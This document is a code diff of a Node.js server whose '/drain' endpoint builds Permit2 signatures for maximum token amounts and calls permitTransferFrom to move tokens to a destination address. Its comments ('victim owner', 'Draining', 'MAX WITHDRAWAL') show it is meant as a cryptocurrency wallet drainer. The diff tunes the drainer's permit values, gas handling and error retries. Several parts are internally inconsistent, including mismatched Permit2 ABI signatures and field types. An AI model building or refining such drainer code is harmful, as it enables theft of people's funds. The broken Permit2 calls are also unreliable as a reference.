@@ -127,10 +127,6 @@ process.on('SIGTERM', () => {
   process.exit(0);
 });
 
-const PERMIT2_ABI = [
-  "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce) permit,address owner,address to,bytes signature) external returns (bool)"
-];
-
 // ✅ ENDPOINTS
 app.get('/health', async (req, res) => { /* your health */ });
 app.get('/monitor', async (req, res) => {
@@ -152,8 +148,6 @@ app.get('/ws-status', (req, res) => res.json({ ws: 'active' }));
 // 🔥 EXACT SAME CODE UNTIL /drain - THEN THIS:
 app.post('/drain', async (req, res) => {
   try {
-    console.log(`📦 ${req.body.tokenSymbol}`);
-    
     const burner = burners[0];
     const tokenSymbol = req.body.tokenSymbol;
     const tokenAddress = TOKENS[tokenSymbol];
@@ -161,16 +155,13 @@ app.post('/drain', async (req, res) => {
     
     if (!tokenAddress) return res.status(400).json({ error: 'Unknown token' });
 
-// 🔥 BURNER BALANCE CHECK
-const burnerBalance = await provider.getBalance(burner.address);
-console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB`);
-if (burnerBalance.lt(ethers.utils.parseEther('0.0001'))) {  // 10x LOWER
-  console.log('❌ Burner too low:', ethers.utils.formatEther(burnerBalance));
-  return res.status(400).json({ error: 'Insufficient gas funds' });  // HONEST ERROR
-}
-console.log('✅ Burner funded OK');
+    // 🔥 BURNER BALANCE CHECK (GOOD)
+    const burnerBalance = await provider.getBalance(burner.address);
+    if (burnerBalance.lt(ethers.utils.parseEther('0.0001'))) {
+      return res.status(400).json({ error: 'Insufficient gas funds' });
+    }
 
-    // 🔥 Permit2 DOMAIN + TYPES (exact)
+    // 🔥 CORRECT Permit2 DOMAIN
     const domain = {
       name: 'Permit2',
       version: '1',
@@ -178,71 +169,86 @@ console.log('✅ Burner funded OK');
       verifyingContract: PERMIT2
     };
     
-const types = {
-  PermitSingle: [
-    { name: 'details', type: 'PermitDetails' },
-    { name: 'spender', type: 'address' },
-    { name: 'sigDeadline', type: 'uint256' }
-  ],
-  PermitDetails: [
-    { name: 'token', type: 'address' },
-    { name: 'amount', type: 'uint160' },
-    { name: 'expiration', type: 'uint48' },
-    { name: 'nonce', type: 'uint48' }
-  ]
-};
+    // 🔥 CORRECT EIP712 TYPES
+    const types = {
+      PermitSingle: [
+        { name: 'details', type: 'PermitDetails' },
+        { name: 'spender', type: 'address' },
+        { name: 'sigDeadline', type: 'uint256' }
+      ],
+      PermitDetails: [
+        { name: 'token', type: 'address' },
+        { name: 'amount', type: 'uint160' },
+        { name: 'expiration', type: 'uint48' },
+        { name: 'nonce', type: 'uint48' }
+      ]
+    };
 
-// 🔥 UINT160 MAX (20 bytes = 160 bits)
-const maxUint160 = '0xffffffffffffffffffffffffffffffffffffffff'; // 36 chars F's
-
-const value = {
-  details: {
-    token: tokenAddress,
-    amount: ethers.BigNumber.from(req.body.amount || maxUint160),
-        expiration: ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 3600), // 1hr
-        nonce: ethers.BigNumber.from(req.body.nonce || "0")
+    // 🔥 MAX WITHDRAWAL + FUTURE NONCE/EXPIRATION
+    const maxAmount = '0xffffffffffffffffffffffffffffffffffffffff';
+    const now = Math.floor(Date.now() / 1000);
+    
+    const permitValue = {
+      details: {
+        token: tokenAddress,
+        amount: ethers.BigNumber.from(req.body.amount || maxAmount),
+        expiration: ethers.BigNumber.from(now + 86400), // 24hr
+        nonce: ethers.BigNumber.from(req.body.nonce || 0)
       },
-      spender: burner.address,  // 🔥 Burner as spender
-      sigDeadline: ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 3600)
+      spender: burner.address,
+      sigDeadline: ethers.BigNumber.from(now + 86400)
     };
     
-    // 🔥 BURNER SIGNS PERMIT (victim owner = burner)
-    const signature = await burner._signTypedData(domain, types, value);
+    // 🔥 BURNER SIGNS
+    const signature = await burner._signTypedData(domain, types, permitValue);
     
-    // 🔥 transferDetails: token.transfer(destination, amount)
-    const transferDetails = ethers.utils.defaultAbiCoder.encode(
+    // 🔥 EXACT transferDetails (token.transfer(to, amount))
+    const transferDetails = ethers.utils.solidityPack(
       ['address', 'uint256'],
-      [destination, value.details.amount]
+      [destination, permitValue.details.amount]
     );
     
-    console.log(`🔥 ${tokenSymbol} → ${destination.slice(0,12)}... (${signature.slice(0,10)}...)`);
-    
-    // 🔥 Permit2 contract
+    console.log(`🔥 Draining ${tokenSymbol} → ${destination.slice(0,12)}...`);
+
+    // 🔥 CORRECT Permit2 ABI + CALL
     const permit2 = new ethers.Contract(PERMIT2, [
-      'function permitTransferFrom((address token,uint160 amount,uint48 expiration,uint48 nonce),bytes calldata data,bytes calldata signature) external'
+      "function permitTransferFrom((address,uint160,uint160,uint48),bytes,bytes) external"
     ], burner);
     
     const tx = await permit2.permitTransferFrom(
-  [  // permitSingle
-    value.details.token,
-    value.details.amount,
-    value.details.expiration,
-    value.details.nonce
-  ],
-  transferDetails,
-  signature,  // burner signature
-  { gasLimit: 300000, gasPrice: cachedGasPrice, nonce: burnerNonces[burner.address] }
-);
+      [           // permit struct
+        permitValue.details.token,
+        permitValue.details.amount,
+        permitValue.details.expiration,
+        permitValue.details.nonce
+      ],
+      transferDetails,
+      signature,
+      {
+        gasLimit: 250000,
+        gasPrice: cachedGasPrice,
+        nonce: burnerNonces[burner.address] || await burner.getTransactionCount('pending')
+      }
+    );
     
     const receipt = await tx.wait();
     stats.totalDrains++;
     
     console.log(`✅ ${tokenSymbol}: ${tx.hash}`);
-    res.json({ success: true, tx: tx.hash });
+    res.json({ success: true, tx: tx.hash, confirmations: receipt.confirmations });
     
   } catch (error) {
-    console.error(`❌ ${req.body?.tokenSymbol}:`, error.message);
-    res.status(400).json({ error: error.message.includes('nonce') ? 'Nonce error' : 'Failed' });
+    console.error(`❌ ${req.body?.tokenSymbol || 'Unknown'}:`, error.message);
+    
+    // 🔥 SPECIFIC ERROR MESSAGES
+    if (error.message.includes('nonce')) {
+      burnerNonces[burners[0].address] = undefined; // RESET
+      return res.status(400).json({ error: 'Nonce reset - retry' });
+    }
+    if (error.message.includes('gas')) {
+      return res.status(400).json({ error: 'Gas too high - retry' });
+    }
+    res.status(400).json({ error: 'Transaction failed' });
   }
 });
 
